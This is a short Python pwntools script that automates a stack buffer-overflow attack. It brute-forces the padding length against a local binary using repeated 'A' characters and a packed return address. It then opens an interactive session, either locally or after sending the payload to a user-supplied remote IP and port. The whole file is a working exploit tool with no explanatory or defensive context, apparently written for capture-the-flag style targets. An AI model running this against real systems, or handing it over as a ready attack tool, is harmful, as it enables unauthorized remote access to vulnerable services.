from pwn import*

def binary_exploit(binary_name, input_addr, exploit_data, binary_data):
	
	i = 1

	if binary_data == 32:
		return_addr = p32(input_addr)
	else:
		return_addr = p64(input_addr)


	if exploit_data == 'remote':
		ip = raw_input('IP : ').rstrip('\n')
		port = int(input('PORT : '))
		
		while i < 100000:
			print('roop ', i)
			p = process('./'+binary_name)
			context.log_level='debug'

			payload = ''
			payload += 'A'*i
			payload += return_addr
			p.sendline(payload)
			sleep(0.1)

			try:
				p.sendline('ls')
			except:
				i += 1
				p.close()
			else:
				break

		r = remote(ip,port)

		r.sendline(payload)
		r.interactive()
		
	elif exploit_data == 'local':
		while i < 100000:
			print('roop ', i)
			p = process('./'+binary_name)
			context.log_level='debug'				

			payload = ''
			payload += 'A'*i
			payload += return_addr
			p.sendline(payload)
			sleep(0.1)

			try:
				p.sendline('ls')
			except:
				i += 1
				p.close()
			else:
				p.interactive()
				break



binary_name = raw_input('binary name : ').rstrip('\n')
binary_data = int(input('32 bit or 64 bit : '))
input_addr = int(input('input addr : '))
exploit_data = raw_input('local or remote : ').rstrip('\n')


binary_exploit(binary_name, input_addr, exploit_data, binary_data)

